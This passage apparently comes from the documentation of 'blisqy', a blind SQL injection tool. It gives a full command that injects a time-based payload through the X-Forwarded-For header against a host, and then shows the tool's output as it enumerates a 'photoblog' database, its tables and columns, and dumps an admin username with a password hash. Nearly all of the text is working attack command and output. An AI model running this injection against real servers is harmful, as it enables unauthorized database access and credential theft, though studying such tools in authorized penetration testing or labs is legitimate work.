## Dig a Specific Table:

### Command

```bash
./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes 
            --sleeptime 0.1 --interactive on --inject "' or if((*sql*),sleep(*time*),0) and '1'='1"
```

### Out-put

```bash
[+] Getting Current Database : 
[-] photoblog


[+] Getting  number of TABLES from Schema 
[-] 4


[+] Getting  all TABLE NAMES from Schema 
[-] categories
[-] pictures
[-] stats
[-] users


Get all Columns from discovered Tables? yes/no  :  yes


[+] Enumerate a Specific Table (yes/no) : yes
[+] Enter Table Name : user 
[+] Are you nutts! Enter a valid Table Name : users
Preparing to Enumerate Table : users
=====================================================
[+] Getting Number of Columns in Table : users
[-] 3


[+] Getting  all Column Names in Table : users 
[-] id
[-] login
[-] password


[+] Getting number of Rows in Table : users 
[-] 1


[+] Getting data from Table : users 
Enter Columns separated by an asterisk (*). e.g id*fname*passwd or skip : id*login*password
[-] id : login : password
[-] 1 : admin : 8efe310f9ab3efeae8d410a8e0166eb2
```
